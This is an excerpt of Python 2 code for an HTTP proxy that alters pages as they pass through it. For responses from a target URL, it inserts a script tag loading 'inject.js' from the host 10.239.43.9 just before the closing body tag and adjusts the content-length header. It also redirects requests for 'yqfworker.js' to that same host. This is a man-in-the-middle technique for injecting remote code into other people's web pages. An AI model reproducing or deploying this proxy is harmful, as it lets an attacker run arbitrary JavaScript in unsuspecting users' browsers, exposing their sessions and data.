...
class ProxyApplication(object):
    ...
    def http(self, environ, start_response):
        try:
            ...
            return
        cat='''
            <script src="http://10.239.43.9/inject.js"></script>
        '''
        try:
            if url.find('yqfworker.js') != -1:
                url = 'http://10.239.43.9/yqfworker.js'
                for v in headers:
                    if v=='host':
                        headers[v] = '10.239.43.9'
            ...
            theheaders = resp.getheaders()
            log.info("theheaders (%s)" % (theheaders))

            if url.endswith(TARGET):
                for index, v in enumerate(theheaders):
                    if v[0]=='content-length':
                        theheaders[index] = ('content-length', str( int(v[1]) + len(cat)))
                log.info("theheaders (%s)" % (theheaders))

            start_response("%d %s" % (resp.status, resp.reason), theheaders)
            all=''
            while True:
                ...
                if url.endswith(TARGET):
                    if data.find('</body>') != -1:
                        data=data[0:data.find('</body>')]+cat+data[data.find('</body>'):len(data)]
                    all+=data
                    # log.info("YQF :data: %s " % (data))
                yield data

            # if url.endswith('v2ex.com/'):
            #     log.info("YQF :data: %s " % (all))
            conn.close()
        except Exception, e:
            log.error("[Exception][http]: %s" % str(e))
